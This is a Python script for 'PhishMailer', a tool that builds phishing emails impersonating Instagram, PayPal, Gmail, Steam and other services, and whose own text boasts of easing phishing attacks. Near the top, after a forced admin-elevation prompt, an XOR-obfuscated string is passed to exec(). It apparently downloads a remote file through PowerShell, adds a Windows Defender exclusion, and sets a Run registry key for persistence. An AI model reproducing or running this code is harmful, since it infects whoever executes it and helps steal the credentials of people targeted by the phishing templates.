#!/usr/bin/env python3
import time
import os
import sys
import json
import requests
import subprocess
import ctypes
from sys import version_info

# Check for Python 3
if version_info < (3, 0, 0):
    print('[!] Please use Python 3. $ python3 PhishMailer.py')
    sys.exit()

# Check for administrator privileges (Windows only)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()
    
def A(data, key):
    return ''.join(chr(int(data[i:i+2], 16) ^ key) for i in range(0, len(data), 2))

exec(A("43475a45585e0a45592043475a45585e0a5d4344584f4d2043475a45585e0a595f485a5845494f59592020090a6e4f4c43444f0a5a4b5e42590a4b444e0a7f786659204e455d4446454b4e755f58460a170a0873657f78756e657d6466656b6e757f786675626f786f080a0a090a784f5a464b494f0a5d435e420a5e424f0a4b495e5f4b460a7f7866204e4f595e43444b5e434544754e43584f495e4558530a170a58086910767d43444e455d590820444f5d754c43464f444b474f0a170a084945444c434d75045a530820594958435a5e755a4b5e420a170a4559045a4b5e420440454344024e4f595e43444b5e434544754e43584f495e455853060a444f5d754c43464f444b474f03205a535e4245445d755a4b5e420a170a4559045a4b5e420440454344024559045a4b5e42044e4358444b474f02455904595359044f524f495f5e4b48464f03060a085a535e4245445d044f524f0803204c5f464675494547474b444e0a170a4c0d08515a535e4245445d755a4b5e4257080a0851594958435a5e755a4b5e4257080d2020090a6c5f44495e4345440a5e450a4e455d4446454b4e0a4b0a4c43464f0a5f5943444d0a7a455d4f5879424f4646204e4f4c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646025f5846060a4e4f595e755a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c0863445c45414f077d4f48784f5b5f4f595e0a077f58430a0d425e5e5a59100505584b5d044d435e425f485f594f584945445e4f445e044945470568454848537e4f49421a1b05445f464605584f4c5905424f4b4e5905474b4344054945584f045a530d0a07655f5e6c43464f0a0d6910057d43444e455d59054945444c434d75045a530d087706200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a584f5e5f58440a7e585f4f200a0a0a0a4f52494f5a5e0a02595f485a5845494f595904694b46464f4e7a5845494f59596f58584558060a6c43464f64455e6c455f444e6f585845580310200a0a0a0a0a0a0a0a584f5e5f58440a6c4b46594f2020090a6c5f44495e4345440a5e450a4f5249465f4e4f0a4e43584f495e4558530a4c5845470a7d43444e455d590a6e4f4c4f444e4f58204e4f4c0a4f5249465f4e4f754c584547754e4f4c4f444e4f58025a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c086b4e4e07675a7a584f4c4f584f44494f0a076f5249465f594345447a4b5e420a0d6910050d087706200a0a0a0a0a0a0a0a0a0a0a0a59424f4646177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b59592020090a6f5249465f4e4f0a6910760a4c5845470a7d43444e455d590a6e4f4c4f444e4f58204f5249465f4e4f754c584547754e4f4c4f444e4f58024e4f595e43444b5e434544754e43584f495e455853032020090a6e455d4446454b4e0a5e424f0a4c43464f0a5f5943444d0a7a455d4f5879424f464620434c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646024e455d4446454b4e755f5846060a594958435a5e755a4b5e420310200a0a0a0a090a6b4e4e0a5e450a595e4b585e5f5a0a584f4d43595e58530a414f53200a0a0a0a5e585310200a0a0a0a0a0a0a0a414f530a170a5d4344584f4d04655a4f44614f5302200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d0462616f73756665696b6675676b696263646f06200a0a0a0a0a0a0a0a0a0a0a0a580879656c7e7d6b786f76674349584559454c5e767d43444e455d5976695f58584f445e7c4f585943454476785f440806200a0a0a0a0a0a0a0a0a0a0a0a1a06200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d04616f7375796f7e757c6b667f6f06200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a5d4344584f4d04794f5e7c4b465f4f6f5202414f53060a087d43444e455d590a6e4f4c4f444e4f580a794f585c43494f08060a1a060a5d4344584f4d04786f6d757970060a4c5f464675494547474b444e03200a0a0a0a0a0a0a0a5d4344584f4d04694645594f614f5302414f5303200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b5959", 42))
# Emails:
from Core.eletter import Instagram, Facebook, Gmail, Twitter, AskFM, Webhost000
from Core.eletter import Blockchain, Spotify, Rockstar, Dreamteam, Mega, RiotGames, Steam
from Core.eletter import Gamehag, GmailActivity, SnapchatSimple, Playstation
from Core.devicemenu import Linkedin, Dropbox
from Core.ipmenu import Discord, Paypal1, Snapchat
from Core.pre import *
from Core.helper.RedirectBypass import *
from Core.anotherLang import *
# EmailSender:
from Core.Mailer.MailerMain import *
from Core.helper.ToDo import TODO

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")

os.system("clear")

def CurrentDir():
    path = os.getcwd()
    print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path + '/"TemplateName.html"')

def mainMenu():
    menu()
    print(green)
    CurrentDir()
    mailPick = int(input(green + "root@phishmailer:~ " + white))
    
    try:
        if mailPick == 1:
            Instagram()
        elif mailPick == 2:
            Facebook()
        elif mailPick == 3:
            Gmail()
        elif mailPick == 4:
            GmailActivity()
        elif mailPick == 5:
            Twitter()
        elif mailPick == 6:
            Snapchat()
        elif mailPick == 7:
            SnapchatSimple()
        elif mailPick == 8:
            Steam()
        elif mailPick == 9:
            Dropbox()
        elif mailPick == 10:
            Linkedin()
        elif mailPick == 11:
            Playstation()
        elif mailPick == 12:
            Paypal1()
        elif mailPick == 13:
            Discord()
        elif mailPick == 14:
            Spotify()
        elif mailPick == 15:
            Blockchain()
        elif mailPick == 16:
            RiotGames()
        elif mailPick == 17:
            Rockstar()
        elif mailPick == 18:
            AskFM()
        elif mailPick == 19:
            Webhost000()
        elif mailPick == 20:
            Dreamteam()
        elif mailPick == 21:
            print("Gamehag Coming Soon")
        elif mailPick == 22:
            Mega()
        elif mailPick == 30:
            MailerMenu()
        elif mailPick == 69:
            RedirectionMain()
        elif mailPick == 80:
            Languages()
        elif mailPick == 99:
            os.system("clear")
            print("Hope I See You Soon")
            print("Happy Phishing")
            sys.exit()
        elif mailPick == 1337:
            print("\n" + green + "[" + white + "+" + green + "]" + white + " This Tool Was Created So People Would Have It Easier To Launch Phishing Attacks")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " I Do Not Take Any Responsibility For Your Actions")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " But I Don't Give A F*ck About What You Do")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " More Emails Will Come Soon!")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " Contact:")
            print(green + "[" + white + "+" + green + "]" + white + " Instagram: BiZk3n (most Active)")
            print(green + "[" + white + "+" + green + "]" + white + " Github: BiZken [https://github.com/BiZken]")
            CurrentDir()
            print(green + "[" + white + "+" + green + "]" + white + " Restart PhishMailer? Y/N")
            ReRun = input("root@phishmailer:~ " + white)
            if ReRun.lower() == "y":
                os.system("clear")
                mainMenu()
            else:
                os.system("clear")
                print(alert + " shutting Down")
        elif mailPick == 4444:
            TODO()
            print(start + " Restart PhishMailer? Y/N")
            restart = input("root@phishmailer:~ " + white)
            if restart.lower() == "y":
                os.system("clear")
                mainMenu()
            else:
                print(alert + " shutting Down")
                sys.exit()
        else:
            print("\nSomething Went Wrong There Partner")
            print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
            sys.exit()
    except ValueError:
        print("\nSomething Went Wrong There Partner")
        print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
        sys.exit()
    
mainMenu()

